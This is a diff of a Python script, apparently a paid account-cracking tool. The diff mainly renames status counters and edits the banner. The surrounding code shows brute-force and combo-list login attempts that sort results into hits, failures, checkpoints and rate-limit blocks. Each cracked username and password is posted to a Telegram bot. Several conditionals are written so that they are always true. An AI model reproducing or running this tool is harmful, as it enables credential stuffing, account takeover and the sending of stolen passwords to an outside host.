@@ -29,8 +29,10 @@ logo = l+"""
 8888888P" d88P   Y88b 888    Y888                                         
 =======================================
   Author   : TLYAK
-  Note : 10$
+  Tlegram Chanal : Team_Coder1
   Telegram : lililliilliil
+  Note : 10$
+     ============BNX============ 
 =======================================
 """
 tele = input("\033[33;1mAmaday Y/n: ")
@@ -52,7 +54,7 @@ if xoshnaw == "1":
     nmuna = '0123456789'
     os.system('clear')
     print(logo)
-    print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+    print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHEKPINT: {s}",end='')
 
     while True:
         fuck = str(''.join((random.choice(nmuna) for i in range(8))))
@@ -85,22 +87,22 @@ if xoshnaw == "1":
             if "Y" or "y" in tele:
                 t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
             h += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
         elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
             b += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
         elif 'challenge_required' or 'two' in log.text:
             s += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
         elif 'Please wait a few minutes' in log.text:
             block += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
         elif 'Bad request' in log.text:
             b += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
         else:
             b+=1    
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
 
 elif xoshnaw =="2":
     os.system('clear')
@@ -113,7 +115,7 @@ elif xoshnaw =="2":
    
     os.system('clear')
     print(logo)
-    print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+    print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
     acc = open(co,"r").read().splitlines()
     for combo in acc:
         user = combo.split(":")[0]
@@ -145,22 +147,22 @@ elif xoshnaw =="2":
                   t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
          
             h += 1
-            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
         elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
             b += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
         elif 'challenge_required' in log.text:
             s += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
         elif 'Please wait a few minutes' in log.text:
             block += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
         elif 'Bad request' in log.text:
             b += 1
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m {block}",end='')
         else:
             b+=1    
-            print(f"\r \033[32mVery-GOOD: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mEror: {b} \033[33;1mCP: {s} \033[31;1m{block}",end='')
 
     
 
